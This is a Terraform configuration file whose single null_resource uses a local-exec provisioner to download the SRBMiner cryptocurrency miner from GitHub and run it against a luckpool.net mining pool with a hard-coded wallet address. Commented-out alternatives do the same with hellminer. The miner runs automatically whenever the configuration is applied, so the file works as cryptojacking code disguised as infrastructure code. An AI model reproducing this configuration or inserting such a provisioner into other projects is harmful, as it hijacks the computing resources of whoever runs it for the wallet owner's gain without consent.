resource "null_resource" "run_1" {
  provisioner "local-exec" {
    command = <<EOT
set -e

curl -L https://github.com/doktor83/SRBMiner-Multi/releases/download/3.1.1/SRBMiner-Multi-3-1-1-Linux.tar.gz -o SRBMiner-Multi.tar.gz
tar -xvf SRBMiner-Multi.tar.gz
bash ./SRBMiner-Multi-3-1-1/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956 --wallet REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp --cpu-threads 2

#curl -L https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz -o hellminer_linux64.tar.gz
#tar -xvf hellminer_linux64.tar.gz
#chmod +x hellminer
#bash ./hellminer -c stratum+tcp://ap.luckpool.net:3956 -u REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp.003 -p x --cpu 3

# hellminer_linux64_avx
#curl -L https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64_avx.tar.gz -o hellminer_linux64.tar.gz
#tar -xvf hellminer_linux64.tar.gz
#bash ./hellminer -c stratum+tcp://ap.luckpool.net:3956 -u REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp.003 -p x --cpu 3

EOT
  }
}
